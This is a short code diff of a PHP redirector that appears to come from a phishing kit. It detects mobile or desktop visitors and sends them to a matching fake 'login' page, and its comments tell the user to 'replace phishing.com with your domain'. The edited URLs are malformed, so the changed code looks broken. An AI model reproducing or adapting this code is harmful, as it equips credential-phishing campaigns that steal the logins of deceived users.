@@ -20,13 +20,13 @@ else{
   {
     //if visitor of the page is mobile.
     //then show the mobile version.
-    header('Location: https://mitsosan1964.github.io/samosisland//mobile/?id=login'); // just replace phishing.com with your domain.(mobile version)
+    header('Location: https://mitsosan19//mobile/?id=login'); // just replace phishing.com with your domain.(mobile version)
   }
   else
   {
     //if visitor of the page is mobile.
     //then show the desktop version.
-    header("Location: https://mitsosan1964.github.io/samosisland//?id=login"); // same here. (desktop version)
+    header("Location: https://mitsosan1964//?id=login"); // same here. (desktop version)
   }
 }
 ?>
